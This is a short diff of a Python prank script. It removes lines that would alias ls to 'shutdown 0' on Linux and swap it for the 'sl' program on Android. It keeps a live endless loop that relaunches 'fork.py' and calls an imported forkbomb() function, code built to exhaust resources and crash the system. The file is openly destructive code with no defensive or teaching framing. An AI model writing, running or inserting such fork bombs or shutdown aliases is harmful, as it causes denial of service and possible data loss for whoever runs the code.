@@ -1,14 +1,12 @@
 import os
 import platform
 from forkbomb import forkbomb
-if platform.system() == "Android":
-  os.system("yes | pkg install sl")
-  os.system("clear")
-  os.system('alias ls="sl"')
-elif platform.system() == "Linux":
-  os.system('alias ls="shutdown 0"')
-else:
-  pass
+#if platform.system() == "Android":
+  # WILL EVENTALLY PUT SOMETHING HERE
+#elif platform.system() == "Linux":
+  # WILL EVEBTUALLY PUT SOMETHING HERE
+#else:
+  #pass
 while True:
   os.system("python fork.py")
   forkbomb()
